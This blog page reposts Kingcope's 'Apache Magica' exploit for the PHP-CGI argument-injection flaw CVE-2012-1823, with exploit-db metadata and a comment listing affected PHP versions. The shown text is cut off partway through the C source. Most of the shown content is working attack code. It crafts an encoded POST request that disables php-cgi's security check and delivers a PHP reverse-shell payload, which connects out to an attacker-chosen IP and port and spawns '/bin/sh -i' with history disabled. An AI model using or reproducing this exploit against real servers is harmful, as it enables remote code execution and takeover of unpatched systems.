<!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang=""> <!--<![endif]-->
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Apache / PHP 5.x Remote Code Execution Exploit | &#128045; the tamouse pages</title>
  <meta name="description" content="
  Apache / PHP 5.x Remote Code Execution Exploit


">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" href="/blog/images/logo-01.png">
  <link rel="icon" href="/blog/images/logo-01-32x32.png" >
  <link rel="stylesheet" href="/blog/assets/css/main.css">
  <script src="/blog/js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
</head>

  <body>
    <!--[if lt IE 8]>
        <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->

    <div class="full-height-wrapper">
      <div class="two-column-wrapper">
        <aside class="sidebar">
  <div class="">
    <h4><a class="" href="/blog/">&#128045; the tamouse pages</a></h4>
  </div>
  <nav class="" role="navigation">
    <div class="">
      <div id="" class="">
        <form method="get" id="search" action="https://duckduckgo.com/"
	            class="form-inline" role="search">
	        <input type="hidden" name="sites"value="blog.tamouse.org"/>
	        <input type="hidden" name="ka" value="h"/>
	        <input type="hidden" name="k7" value="#fafafa"/>
	        <input type="hidden" name="kj" value="#3f3f3f"/>
	        <input type="hidden" name="ky" value="#fafafa"/>
	        <input type="hidden" name="kx" value="b"/>
	        <input type="hidden" name="kt" value="Helvetica"/>
          <div class="form-group">
            <label class="sr-only" for="q">Search for</label>
	          <input type="text" name="q" maxlength="255" placeholder="Search" class="form-control"/>
            <button type="submit" class="btn btn-default">
	            <i class="fa fa-search"></i>
	          </button>
          </div>
        </form>
        <ul class="nav nav-pills nav-stacked">
	        
	        <li><a href="/blog/about">About</a></li>
	        
	        <li><a href="/blog/pages/posts">Posts</a></li>
	        
	        <li><a href="/blog/pages">Pages</a></li>
	        
	        <li>
            <a href="/blog/humans.txt">
              Colophon
            </a>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <footer class="" role="navigation">
    <div class="">
      <div id="" class="">
        <ul class="nav nav-pills nav-stacked">
          <li>
            <a href="https://twitter.com/tamouse"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-twitter"></i>
              twitter
              @tamouse
            </a>
          </li>
          <li>
            <a href="https://github.com/tamouse"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-github"></i>
              github
              tamouse
            </a>
          </li>
          <li>
            <a href="http://tamouse.org"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-home"></i>
              tamouse.org
            </a>
          </li>
          <li>
            <a href="https://tamouse.github.io/swaac"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-laptop"></i>
              software as a craft
            </a>
          </li>
          <li>
            <a href="https://tamouse.art"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-paint-brush"></i>
              art blog
            </a>
          </li>
          <li>
            <a href="https://tamouse.github.io/recipes"
               target="_blank" rel="noopener nofollow">
              <i class="glyphicon glyphicon-cutlery"></i>
              recipes
            </a>
          </li>
          <li>
            <a href="https://tamouse.github.io/resume"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-terminal"></i>
              resume
            </a>
          </li>
          <li>
            <a href="mailto:tamouse@gmail.com"
               target="_blank" rel="noopener nofollow">
              <i class="fa fa-envelope"></i>
              email
            </a>
          </li>
	  <li>
	    <a href="https://keybase.io/tamouse_" target="blank" rel="noopener noreferrer nofollow" title="Pick the one with the tail, not the one without!">keybase</a>
	  </li>
        </ul>
      </div>
    </div>
    <section id="pinboard-feed" data-pinboard-user="tamouse" data-proxyurl="https://fierce-plains-36687.herokuapp.com/"></section>

    <div class="">
      <h4><a class="" href="/blog/">&copy; 2019 Tamara Temple</a></h4>
    </div>
  </footer>
</aside>

        <main class="container">
          <article>
<header class="page-header">
<h1>Apache / PHP 5.x Remote Code Execution Exploit</h1>
Oct 30, 2013


</header>

<blockquote>
  <h1 id="apache--php-5x-remote-code-execution-exploit">Apache / PHP 5.x Remote Code Execution Exploit</h1>
</blockquote>

<hr />

<blockquote>
  <ul>
    <li>EDB-ID: 29290</li>
    <li>CVE: <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1823">2012-1823</a></li>
    <li>OSVDB-ID: N/A</li>
    <li>Author: Kingcope</li>
    <li>Published: 2013-10-29</li>
    <li>Verified: <img src="http://www.exploit-db.com/images/cancel.png" alt="Not Verified" /></li>
    <li>Exploit Code: <a href="/download/29290"><img src="http://www.exploit-db.com/images/46.png" alt="Download" title="Download" /></a></li>
    <li>Vulnerable App: N/A</li>
  </ul>
</blockquote>

<hr />

<blockquote>
  <h2 id="rating">Rating</h2>

  <p>Overall: (0.0)</p>
</blockquote>

<h4 id="this-is-a-code-execution-bug-in-the-combination-of-apache-and-php">This is a code execution bug in the combination of Apache and PHP.</h4>

<blockquote>

</blockquote>
<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&gt;</span> <span class="cm">/* Apache Magica by Kingcope */</span>
<span class="o">&gt;</span> <span class="cm">/* gcc apache-magika.c -o apache-magika -lssl */</span>
<span class="o">&gt;</span> <span class="cm">/* This is a code execution bug in the combination of Apache and PHP.
&gt; On Debian and Ubuntu the vulnerability is present in the default install
&gt; of the php5-cgi package. When the php5-cgi package is installed on Debian and
&gt; Ubuntu or php-cgi is installed manually the php-cgi binary is accessible under
&gt; /cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute
&gt; the binary because this binary has a security check enabled when installed with
&gt; Apache http server and this security check is circumvented by the exploit.
&gt; When accessing the php-cgi binary the security check will block the request and
&gt; will not execute the binary.
&gt; In the source code file sapi/cgi/cgi_main.c of PHP we can see that the security
&gt; check is done when the php.ini configuration setting cgi.force_redirect is set
&gt; and the php.ini configuration setting cgi.redirect_status_env is set to no.
&gt; This makes it possible to execute the binary bypassing the Security check by
&gt; setting these two php.ini settings.
&gt; Prior to this code for the Security check getopt is called and it is possible
&gt; to set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the
&gt; -d switch. If both values are set to zero and the request is sent to the server
&gt; php-cgi gets fully executed and we can use the payload in the POST data field
&gt; to execute arbitrary php and therefore we can execute programs on the system.
&gt; apache-magika.c is an exploit that does exactly the prior described. It does
&gt; support SSL.
&gt; /* Affected and tested versions
&gt; PHP 5.3.10
&gt; PHP 5.3.8-1
&gt; PHP 5.3.6-13
&gt; PHP 5.3.3
&gt; PHP 5.2.17
&gt; PHP 5.2.11
&gt; PHP 5.2.6-3
&gt; PHP 5.2.6+lenny16 with Suhosin-Patch
&gt; Affected versions
&gt; PHP prior to 5.3.12
&gt; PHP prior to 5.4.2
&gt; Unaffected versions
&gt; PHP 4 - getopt parser unexploitable
&gt; PHP 5.3.12 and up
&gt; PHP 5.4.2 and up
&gt; Unaffected versions are patched by CVE-2012-1823.
&gt; */</span>
<span class="o">&gt;</span> <span class="cm">/*    .
&gt;      /'\rrq rk
&gt;  .  // \\  .
&gt; .x.//fco\\-|-
&gt;  '//cmtco\\zt
&gt;  //6meqrg.\\tq
&gt; //_________\\'
&gt; EJPGQO
&gt; apache-magica.c by Kingcope
&gt; */</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">getopt</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stddef</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">openssl</span><span class="o">/</span><span class="n">rand</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">openssl</span><span class="o">/</span><span class="n">ssl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">openssl</span><span class="o">/</span><span class="n">err</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">netdb</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
<span class="o">&gt;</span>     <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
<span class="o">&gt;</span>     <span class="n">SSL</span> <span class="o">*</span><span class="n">handle</span><span class="p">;</span>
<span class="o">&gt;</span>     <span class="n">SSL_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="p">}</span> <span class="n">connection</span><span class="p">;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="kt">void</span> <span class="n">usage</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="o">&gt;</span> <span class="p">{</span>
<span class="o">&gt;</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"usage: %s &lt;--target target&gt; &lt;--port port&gt; &lt;--protocol http|https&gt; "</span>   
<span class="o">&gt;</span>   <span class="s">"&lt;--reverse-ip ip&gt; &lt;--reverse-port port&gt; [--force-interpreter interpreter]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
<span class="o">&gt;</span>    <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="o">&gt;</span>   <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="o">&gt;</span> <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="kt">char</span> <span class="n">poststr</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F"</span>   
<span class="o">&gt;</span>  <span class="s">"%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64"</span>   
<span class="o">&gt;</span>  <span class="s">"+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73"</span>   
<span class="o">&gt;</span>  <span class="s">"%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E"</span>   
<span class="o">&gt;</span>  <span class="s">"%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63"</span>   
<span class="o">&gt;</span>  <span class="s">"%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62"</span>   
<span class="o">&gt;</span>  <span class="s">"%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74"</span>   
<span class="o">&gt;</span>  <span class="s">"%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68"</span>   
<span class="o">&gt;</span>  <span class="s">"%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F"</span>   
<span class="o">&gt;</span>  <span class="s">"%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63"</span>   
<span class="o">&gt;</span>  <span class="s">"%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73"</span>   
<span class="o">&gt;</span>  <span class="s">"%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span>   
<span class="o">&gt;</span>  <span class="s">"Host: %s</span><span class="se">\r\n</span><span class="s">"</span>   
<span class="o">&gt;</span>  <span class="s">"User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26"</span>   
<span class="o">&gt;</span>  <span class="s">"(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25</span><span class="se">\r\n</span><span class="s">"</span>   
<span class="o">&gt;</span>  <span class="s">"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">"</span>   
<span class="o">&gt;</span>  <span class="s">"Content-Length: %d</span><span class="se">\r\n</span><span class="s">"</span>   
<span class="o">&gt;</span>  <span class="s">"Connection: close</span><span class="se">\r\n\r\n</span><span class="s">%s"</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="kt">char</span> <span class="n">phpstr</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"&lt;?php</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"set_time_limit(0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$ip = '%s';</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$port = %d;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$chunk_size = 1400;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$write_a = null;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$error_a = null;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$daemon = 0;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$debug = 0;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"if (function_exists('pcntl_fork')) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  $pid = pcntl_fork();    </span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if ($pid == -1) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      printit(</span><span class="se">\"</span><span class="s">ERROR: Can't fork</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      exit(1);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if ($pid) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      exit(0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (posix_setsid() == -1) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      printit(</span><span class="se">\"</span><span class="s">Error: Can't setsid()</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      exit(1);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  $daemon = 1;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"} else {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  printit(</span><span class="se">\"</span><span class="s">WARNING: Failed to daemonise.</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"}</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"chdir(</span><span class="se">\"</span><span class="s">/</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"umask(0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"if (!$sock) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  printit(</span><span class="se">\"</span><span class="s">$errstr ($errno)</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  exit(1);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"}</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$descriptorspec = array(</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"   0 =&gt; array(</span><span class="se">\"</span><span class="s">pipe</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">r</span><span class="se">\"</span><span class="s">),</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"   1 =&gt; array(</span><span class="se">\"</span><span class="s">pipe</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">w</span><span class="se">\"</span><span class="s">),</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"   2 =&gt; array(</span><span class="se">\"</span><span class="s">pipe</span><span class="se">\"</span><span class="s">, </span><span class="se">\"</span><span class="s">w</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">");</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"$process = proc_open($shell, $descriptorspec, $pipes);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"if (!is_resource($process)) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  printit(</span><span class="se">\"</span><span class="s">ERROR: Can't spawn shell</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  exit(1);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"}</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"stream_set_blocking($pipes[0], 0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"stream_set_blocking($pipes[1], 0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"stream_set_blocking($pipes[2], 0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"stream_set_blocking($sock, 0);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"while (1) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (feof($sock)) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      printit(</span><span class="se">\"</span><span class="s">ERROR: Shell connection terminated</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      break;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (feof($pipes[1])) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      printit(</span><span class="se">\"</span><span class="s">ERROR: Shell process terminated</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      break;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  $read_a = array($sock, $pipes[1], $pipes[2]);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (in_array($sock, $read_a)) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">SOCK READ</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      $input = fread($sock, $chunk_size);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">SOCK: $input</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      fwrite($pipes[0], $input);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (in_array($pipes[1], $read_a)) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">STDOUT READ</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      $input = fread($pipes[1], $chunk_size);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">STDOUT: $input</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      fwrite($sock, $input);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (in_array($pipes[2], $read_a)) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">STDERR READ</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      $input = fread($pipes[2], $chunk_size);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      if ($debug) printit(</span><span class="se">\"</span><span class="s">STDERR: $input</span><span class="se">\"</span><span class="s">);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      fwrite($sock, $input);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"}</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"fclose($sock);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"fclose($pipes[0]);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"fclose($pipes[1]);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"fclose($pipes[2]);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"proc_close($process);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"function printit ($string) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  if (!$daemon) {</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"      print </span><span class="se">\"</span><span class="s">$string</span><span class="se">\n\"</span><span class="s">;</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"  }</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"}</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"exit(1);</span><span class="se">\n</span><span class="s">"</span>   
<span class="o">&gt;</span> <span class="s">"?&gt;"</span><span class="p">;</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="n">gethostbyname_</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">hostname</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">port</span><span class="p">)</span>
<span class="o">&gt;</span> <span class="p">{</span>
<span class="o">&gt;</span>  <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">he</span><span class="p">;</span>
<span class="o">&gt;</span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">,</span> <span class="o">*</span><span class="n">servercopy</span><span class="p">;</span>
<span class="o">&gt;</span>  
<span class="o">&gt;</span>  <span class="k">if</span> <span class="p">((</span><span class="n">he</span><span class="o">=</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">hostname</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>   <span class="n">printf</span><span class="p">(</span><span class="s">"Hostname cannot be resolved</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>   <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>  <span class="p">}</span>
<span class="o">&gt;</span>  
<span class="o">&gt;</span>  <span class="n">servercopy</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
<span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">servercopy</span><span class="p">)</span> <span class="p">{</span>
<span class="o">&gt;</span>     <span class="n">printf</span><span class="p">(</span><span class="s">"malloc error (1)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="o">&gt;</span>     <span class="n">exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
<span class="o">&gt;</span>  <span class="p">}</span>
<span class="o">&gt;</span>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
<span class="o">&gt;</span>  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">he</span><span class="o">-&gt;</span><span class="n">h_addr_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>  <span class="n">he</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
<span class="o">&gt;</span>  <span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="o">&gt;</span>  <span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
<span class="o">&gt;</span>  <span class="n">memcpy</span><span class="p">(</span><span class="n">servercopy</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
<span class="o">&gt;</span>  <span class="k">return</span> <span class="n">servercopy</span><span class="p">;</span>
<span class="o">&gt;</span> <span class="p">}</span>
<span class="o">&gt;</span> 
<span class="o">&gt;</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sslread</span><span class="p">(</span><span class="n">connection</span> <span class="o">*</span><span class="n">c</span><span class="p">)</span>
<span class="o">&gt;</span> <span class="p">{</span>
<span class="o">&gt;</span>   <span class="kt">char</span> <span class="o">*</span><span class="n">rc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
